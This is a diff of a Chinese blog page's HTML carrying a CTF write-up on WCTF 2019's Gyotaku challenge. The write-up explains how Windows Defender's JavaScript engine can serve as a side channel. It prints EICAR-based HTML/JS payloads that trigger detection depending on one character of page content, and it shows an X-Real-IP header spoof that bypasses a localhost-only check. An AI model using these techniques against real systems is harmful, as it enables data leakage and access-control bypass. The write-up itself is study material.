@@ -57,7 +57,7 @@
     "datePublished": "2019-09-05 13:25:41 \x2b0800 CST",
     "dateModified" : "2019-09-05 13:25:41 \x2b0800 CST",
     "url" : "https:\/\/syang-ng.github.io\/2019\/09\/side-channel-by-windows-defender\/",
-    "wordCount" : "2994",
+    "wordCount" : "2982",
     "keywords" : [  "syang\x27s blog"]
 }
 </script>
@@ -138,350 +138,281 @@
           
           
 
-          
-
-<h2 id="前言">前言</h2>
-
+          <h2 id="前言">前言</h2>
 <p>利用 Windows Defender 进行侧信道攻击是 TokyoWesterns 在 WCTF 2019 上提出来的一种新的思路，与之相关的是 WCTF 2019 的题目 Gyotaku 和 TWCTF2019 的 PHP note。</p>
-
 <p>##Windows Defender</p>
-
 <p>根据 icchy 在分享环节 ppt 的总结，Windows Defender 会表现出如下特征：</p>
-
 <blockquote>
 <ul>
 <li>As we investigated:
-
 <ol>
 <li>check the content of the file whether malicious data included</li>
 <li>change permission to prevent user from accessing</li>
 <li>Replace malicious part with null bytes</li>
 <li>(delete entire file)</li>
-</ol></li>
+</ol>
+</li>
 <li>In step 2:
-
 <ul>
 <li>the file obtained by SYSTEM</li>
 <li><strong>user cannot open the file</strong></li>
-</ul></li>
+</ul>
+</li>
 </ul>
 </blockquote>
-
 <p>而只要找到一种合适的方式，我们可以在某种程度上滥用 Windows Defender 的这种特性，进而进行侧信道攻击。</p>
-
 <h3 id="如何触发-windows-defender">如何触发 Windows Defender</h3>
-
 <p>很简单，利用 EICAR 测试文件即可，关于什么是 EICAR 测试文件，以下是官方简介：</p>
-
 <blockquote>
 <p>欧洲计算机防病毒研究所 (EICAR) 开发了一种测试病毒，可用于测试您的防病毒设备。此脚本是一个惰性文本文件。二进制特征码包含在多数防病毒产品供应商的病毒码文件中。它本质上不是病毒，并且不包含任何程序代码。</p>
 </blockquote>
-
 <p>将下面内容写入一个 eicar.com 文件，然后尝试访问：</p>
-
 <pre><code>X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
-</code></pre>
-
-<p>尝试读取该文件，可以发现触发了 Windows Defender 的拦截：</p>
-
-<pre><code class="language-powershell">PS C:\Users\syang\Desktop&gt; type .\eicar.com
-type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。
-所在位置 行:1 字符: 1
+</code></pre><p>尝试读取该文件，可以发现触发了 Windows Defender 的拦截：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\syang\Desktop&gt; type .\eicar.com
+type <span style="color:#960050;background-color:#1e0010">:</span> 无法成功完成操作<span style="color:#960050;background-color:#1e0010">，</span>因为文件包含病毒或潜在的垃圾软件<span style="color:#960050;background-color:#1e0010">。</span>
+所在位置 行<span style="color:#960050;background-color:#1e0010">:</span>1 字符<span style="color:#960050;background-color:#1e0010">:</span> 1
 + type .\eicar.com
 + ~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ReadError: (C:\Users\syang\Desktop\eicar.com:String) [Get-Content], IOException
-    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand%
-</code></pre>
-
-<h3 id="jscript-engine-in-mpengine-dll">JScript engine in mpengine.dll</h3>
-
-<p>作为 Windows Defender 最核心的动态链接库，mpengine.dll 实现了对多种文件的检测功能，其中就包括了一个 JS 引擎，该引擎对 JS 相关的内容进行分析，比如 eval 的参数，这里的 JS 脚本包括 HTML 中的 <code>&lt;script&gt;</code> 标签中的内容。这里贴一份 <a href="https://n0b0dycn.me/" rel="nofollow noreferrer" target="_blank">n0b0dy</a> 师傅测试成功的 payload，可以看到尝试访问时会触发 Windows Defender：</p>
-
-<pre><code class="language-html">&lt;script&gt;
-var body = document.body.innerHTML;
-var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;;
-eval(mal);
-&lt;/script&gt;
-&lt;body&gt;&lt;/body&gt;
-</code></pre>
-
-<pre><code class="language-powershell">PS C:\Users\syang\Desktop&gt; type .\test.html
-type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。
-所在位置 行:1 字符: 1
+    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> ReadError<span style="color:#960050;background-color:#1e0010">:</span> (C:\Users\syang\Desktop\eicar.com<span style="color:#960050;background-color:#1e0010">:</span>String) [Get-Content], IOException
+    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand%
+</code></pre></div><h3 id="jscript-engine-in-mpenginedll">JScript engine in mpengine.dll</h3>
+<p>作为 Windows Defender 最核心的动态链接库，mpengine.dll 实现了对多种文件的检测功能，其中就包括了一个 JS 引擎，该引擎对 JS 相关的内容进行分析，比如 eval 的参数，这里的 JS 脚本包括 HTML 中的 <code>&lt;script&gt;</code> 标签中的内容。这里贴一份 <a href="https://n0b0dycn.me/">n0b0dy</a> 师傅测试成功的 payload，可以看到尝试访问时会触发 Windows Defender：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">mal</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&#34;</span>;
+eval(<span style="color:#a6e22e">mal</span>);
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\syang\Desktop&gt; type .\test.html
+type <span style="color:#960050;background-color:#1e0010">:</span> 无法成功完成操作<span style="color:#960050;background-color:#1e0010">，</span>因为文件包含病毒或潜在的垃圾软件<span style="color:#960050;background-color:#1e0010">。</span>
+所在位置 行<span style="color:#960050;background-color:#1e0010">:</span>1 字符<span style="color:#960050;background-color:#1e0010">:</span> 1
 + type .\test.html
 + ~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ReadError: (C:\Users\syang\Desktop\test.html:String) [Get-Content], IOException
-    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand
-</code></pre>
-
-<p>但这里有个值得困惑的点是本人使用了类似的 payload 却不会触发 Windows Defender 的预警：</p>
-
-<pre><code class="language-html">&lt;script&gt;
-eval(&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);
-&lt;/script&gt;
-&lt;body&gt;&lt;/body&gt;
-</code></pre>
-
-<p>看到 n0b0dy 师傅也提了一句：</p>
-
+    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> ReadError<span style="color:#960050;background-color:#1e0010">:</span> (C:\Users\syang\Desktop\test.html<span style="color:#960050;background-color:#1e0010">:</span>String) [Get-Content], IOException
+    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand
+</code></pre></div><p>但这里有个值得困惑的点是本人使用了类似的 payload 却不会触发 Windows Defender 的预警：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;
+eval(<span style="color:#e6db74">&#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&#34;</span>);
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;
+</code></pre></div><p>看到 n0b0dy 师傅也提了一句：</p>
 <blockquote>
 <p>但是如果不加第二行<code>var body = document.body.innerHTML;</code>的话，则无法触发Windows Defender。</p>
 </blockquote>
-
 <p>大概只能归因于 Windows Defender 的奇怪特性。另外根据分享的 ppt，可以发现该引擎还有如下几个特性：</p>
-
 <blockquote>
 <ul>
 <li>if statement will never be evaluated
-
 <ul>
 <li>if (true) {eval(&ldquo;EICA&rdquo; + &ldquo;R&rdquo;)} -&gt; not detected</li>
 <li><strong>object accessing</strong> will help you: {0: &ldquo;a&rdquo;, 1: &ldquo;b&rdquo;, …}[input]</li>
-</ul></li>
+</ul>
+</li>
 <li>parser stops on null byte
-
 <ul>
-<li>eval(&ldquo;EICA&rdquo; + &ldquo;[NULL]&ldquo;) -&gt; syntax error</li>
+<li>eval(&ldquo;EICA&rdquo; + &ldquo;[NULL]&quot;) -&gt; syntax error</li>
 <li>parser will not stop no null byte (in HTML document)</li>
-</ul></li>
+</ul>
+</li>
 </ul>
 </blockquote>
-
 <p>所以，利用以上特性和 JavaScript 能访问页面元素的特性，可以进行侧信道攻击，比如以下代码会触发 Windows Defender 的预警：</p>
-
-<pre><code class="language-html">&lt;script&gt;
-var body = document.body.innerHTML;
-var n = body[0];
-var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&quot;+n;
-eval(mal);
-&lt;/script&gt;
-&lt;body&gt;*&lt;/body&gt;
-</code></pre>
-
-<p>而以下内容不会：</p>
-
-<pre><code class="language-html">&lt;script&gt;
-var body = document.body.innerHTML;
-var n = body[0];
-var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&quot;+n;
-eval(mal);
-&lt;/script&gt;
-&lt;body&gt;a&lt;/body&gt;
-</code></pre>
-
-<p>由此，赞美 TokyoWesterns，一个全新的侧信道思路出现了！</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">body</span>[<span style="color:#ae81ff">0</span>];
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">mal</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">n</span>;
+eval(<span style="color:#a6e22e">mal</span>);
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;*&lt;/<span style="color:#f92672">body</span>&gt;
+</code></pre></div><p>而以下内容不会：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">body</span>[<span style="color:#ae81ff">0</span>];
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">mal</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">n</span>;
+eval(<span style="color:#a6e22e">mal</span>);
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;a&lt;/<span style="color:#f92672">body</span>&gt;
+</code></pre></div><p>由此，赞美 TokyoWesterns，一个全新的侧信道思路出现了！</p>
 <h2 id="gyotaku">Gyotaku</h2>
-
-<p>题目 repo：<a href="https://github.com/icchy/wctf2019-gtf" rel="nofollow noreferrer" target="_blank">WCTF2019: Gyotaku The Flag</a></p>
-
+<p>题目 repo：<a href="https://github.com/icchy/wctf2019-gtf">WCTF2019: Gyotaku The Flag</a></p>
 <h3 id="非预期">非预期</h3>
-
 <p>题目本身是基于 echo 框架的，阅读题目源码，可以发现在 <code>main.go</code> 中直接定义了获得了 flag 的接口： <code>e.GET(&quot;/flag&quot;, FlagHandler, InternalRequiredMiddleware)</code> ，所以只要满足 <code>InternalRequiredMiddleware</code> 的验证，即可获得 flag。</p>
-
 <p>阅读相应源码，可以发现需要满足访问 ip 为 127.0.0.1 这个条件即可通过验证：</p>
-
-<pre><code class="language-go">func InternalRequiredMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
-	return func(c echo.Context) error {
-		ip := net.ParseIP(c.RealIP())
-		localip := net.ParseIP(&quot;127.0.0.1&quot;)
-		if !ip.Equal(localip) {
-			return echo.NewHTTPError(http.StatusForbidden)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">InternalRequiredMiddleware</span>(<span style="color:#a6e22e">next</span> <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">HandlerFunc</span>) <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">HandlerFunc</span> {
+	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">Context</span>) <span style="color:#66d9ef">error</span> {
+		<span style="color:#a6e22e">ip</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">ParseIP</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">RealIP</span>())
+		<span style="color:#a6e22e">localip</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">ParseIP</span>(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>)
+		<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ip</span>.<span style="color:#a6e22e">Equal</span>(<span style="color:#a6e22e">localip</span>) {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">NewHTTPError</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusForbidden</span>)
 		}
-		return next(c)
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">next</span>(<span style="color:#a6e22e">c</span>)
 	}
 
-</code></pre>
-
-<p>而根据 echo 对 <code>RealIP</code>  的实现，这里可以使用 <code>X-Real-IP: 127.0.0.l</code> 欺骗进而绕过：</p>
-
-<pre><code class="language-go">func (c *context) RealIP() string {
-	if ip := c.request.Header.Get(HeaderXForwardedFor); ip != &quot;&quot; {
-		return strings.Split(ip, &quot;, &quot;)[0]
+</code></pre></div><p>而根据 echo 对 <code>RealIP</code>  的实现，这里可以使用 <code>X-Real-IP: 127.0.0.l</code> 欺骗进而绕过：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">context</span>) <span style="color:#a6e22e">RealIP</span>() <span style="color:#66d9ef">string</span> {
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">HeaderXForwardedFor</span>); <span style="color:#a6e22e">ip</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">ip</span>, <span style="color:#e6db74">&#34;, &#34;</span>)[<span style="color:#ae81ff">0</span>]
 	}
-	if ip := c.request.Header.Get(HeaderXRealIP); ip != &quot;&quot; {
-		return ip
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">HeaderXRealIP</span>); <span style="color:#a6e22e">ip</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ip</span>
 	}
-	ra, _, _ := net.SplitHostPort(c.request.RemoteAddr)
-	return ra
+	<span style="color:#a6e22e">ra</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">SplitHostPort</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RemoteAddr</span>)
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ra</span>
 }
-</code></pre>
-
-<p>充分说明了出题后验题的重要性（）</p>
-
+</code></pre></div><p>充分说明了出题后验题的重要性（）</p>
 <h2 id="预期解">预期解</h2>
-
 <p>理论上的预期解，无需访问 <code>/flag</code> ，而是使用 Windows Defender 的特性进行侧信道，进而泄露出 flag。</p>
-
 <p>首先回到题目本身，来看到除了直接访问 <code>/flag</code> 路径外，是否存在着第二种方式可以获得 flag。很容易就注意到 <code>e.POST(&quot;/gyotaku&quot;, GyotakuHandler(dbconn), LoginRequiredMiddleware)</code>，继续跟进 <code>GyotakuHandler</code> 函数，可以发现该函数会根据传入的参数 <code>url</code> 进行请求相应资源，然后保存到本地。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GyotakuHandler</span>(<span style="color:#a6e22e">db</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">DBConn</span>) <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">HandlerFunc</span> {
+	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">Context</span>) <span style="color:#66d9ef">error</span> {
+		<span style="color:#a6e22e">sess</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">SessionName</span>, <span style="color:#a6e22e">c</span>)
+		<span style="color:#a6e22e">username</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">Values</span>[<span style="color:#e6db74">&#34;username&#34;</span>].(<span style="color:#66d9ef">string</span>)
 
-<pre><code class="language-go">func GyotakuHandler(db *DBConn) echo.HandlerFunc {
-	return func(c echo.Context) error {
-		sess, _ := session.Get(SessionName, c)
-		username := sess.Values[&quot;username&quot;].(string)
+		<span style="color:#a6e22e">url</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">FormValue</span>(<span style="color:#e6db74">&#34;url&#34;</span>)
 
-		url := c.FormValue(&quot;url&quot;)
+		<span style="color:#75715e">// generate gyotaku id
+</span><span style="color:#75715e"></span>		<span style="color:#a6e22e">gid</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%x&#34;</span>, <span style="color:#a6e22e">sha256</span>.<span style="color:#a6e22e">Sum256</span>([]byte(<span style="color:#a6e22e">url</span>)))
 
-		// generate gyotaku id
-		gid := fmt.Sprintf(&quot;%x&quot;, sha256.Sum256([]byte(url)))
-
-		_, err := os.Stat(path.Join(GyotakuDir, gid))
-		if !os.IsNotExist(err) {
-			return c.JSON(http.StatusConflict, &quot;this gyotaku has already been taken&quot;)
+		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stat</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#a6e22e">GyotakuDir</span>, <span style="color:#a6e22e">gid</span>))
+		<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">IsNotExist</span>(<span style="color:#a6e22e">err</span>) {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusConflict</span>, <span style="color:#e6db74">&#34;this gyotaku has already been taken&#34;</span>)
 		}
 
-		resp, err := http.Get(url)
-		if err != nil {
-			return err
+		<span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">url</span>)
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
 		}
-		defer resp.Body.Close()
+		<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>.<span style="color:#a6e22e">Close</span>()
 
-		body, err := ioutil.ReadAll(resp.Body)
-		if err != nil {
-			return err
-		}
-
-		// save gyotaku
-		gyotakudata := &amp;GyotakuData{
-			URL:      url,
-			Data:     string(body),
-			UserName: username,
+		<span style="color:#a6e22e">body</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>)
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
 		}
 
-		buf := bytes.NewBuffer(nil)
-		err = gob.NewEncoder(buf).Encode(gyotakudata)
-		if err != nil {
-			return err
-		}
-		err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), 0644)
-		if err != nil {
-			return err
+		<span style="color:#75715e">// save gyotaku
+</span><span style="color:#75715e"></span>		<span style="color:#a6e22e">gyotakudata</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">GyotakuData</span>{
+			<span style="color:#a6e22e">URL</span>:      <span style="color:#a6e22e">url</span>,
+			<span style="color:#a6e22e">Data</span>:     string(<span style="color:#a6e22e">body</span>),
+			<span style="color:#a6e22e">UserName</span>: <span style="color:#a6e22e">username</span>,
 		}
 
-		err = db.AddGyotakuList(username, gid)
-		if err != nil {
-			return err
+		<span style="color:#a6e22e">buf</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">NewBuffer</span>(<span style="color:#66d9ef">nil</span>)
+		<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">gob</span>.<span style="color:#a6e22e">NewEncoder</span>(<span style="color:#a6e22e">buf</span>).<span style="color:#a6e22e">Encode</span>(<span style="color:#a6e22e">gyotakudata</span>)
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+		}
+		<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#a6e22e">GyotakuDir</span>, <span style="color:#a6e22e">gid</span>), <span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">Bytes</span>(), <span style="color:#ae81ff">0644</span>)
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
 		}
 
-		return c.JSON(http.StatusOK, gid)
+		<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">AddGyotakuList</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">gid</span>)
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+		}
+
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">gid</span>)
 	}
 }
-</code></pre>
+</code></pre></div><p>但跟进 <code>GyotakuViewHandler</code> 可以看到题目本身没有实现查看的功能，所以无法查看保存到本地的文件内容：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GyotakuViewHandler</span>(<span style="color:#a6e22e">db</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">DBConn</span>) <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">HandlerFunc</span> {
+	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">Context</span>) <span style="color:#66d9ef">error</span> {
+		<span style="color:#75715e">// sess, _ := session.Get(SessionName, c)
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// username := sess.Values[&#34;username&#34;].(string)
+</span><span style="color:#75715e"></span>		<span style="color:#a6e22e">gid</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Param</span>(<span style="color:#e6db74">&#34;gid&#34;</span>)
 
-<p>但跟进 <code>GyotakuViewHandler</code> 可以看到题目本身没有实现查看的功能，所以无法查看保存到本地的文件内容：</p>
-
-<pre><code class="language-go">func GyotakuViewHandler(db *DBConn) echo.HandlerFunc {
-	return func(c echo.Context) error {
-		// sess, _ := session.Get(SessionName, c)
-		// username := sess.Values[&quot;username&quot;].(string)
-		gid := c.Param(&quot;gid&quot;)
-
-		_, err := os.Stat(path.Join(GyotakuDir, gid))
-		if os.IsNotExist(err) {
-			return c.JSON(http.StatusNotFound, &quot;no such gyotaku&quot;)
+		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stat</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#a6e22e">GyotakuDir</span>, <span style="color:#a6e22e">gid</span>))
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">IsNotExist</span>(<span style="color:#a6e22e">err</span>) {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusNotFound</span>, <span style="color:#e6db74">&#34;no such gyotaku&#34;</span>)
 		}
 
-		_, err = ioutil.ReadFile(path.Join(GyotakuDir, gid))
-		if err != nil {
-			return err
+		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#a6e22e">GyotakuDir</span>, <span style="color:#a6e22e">gid</span>))
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
 		}
 
-		return c.JSON(http.StatusNotImplemented, &quot;sorry but I couldn't make it by the submission deadline :P&quot;)
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusNotImplemented</span>, <span style="color:#e6db74">&#34;sorry but I couldn&#39;t make it by the submission deadline :P&#34;</span>)
 
-		// var gyotakudata GyotakuData
-		// buf := bytes.NewBuffer(data)
-		// err = gob.NewDecoder(buf).Decode(&amp;gyotakudata)
-		// if err != nil {
-		// 	return err
-		// }
-
-		// if username != gyotakudata.UserName {
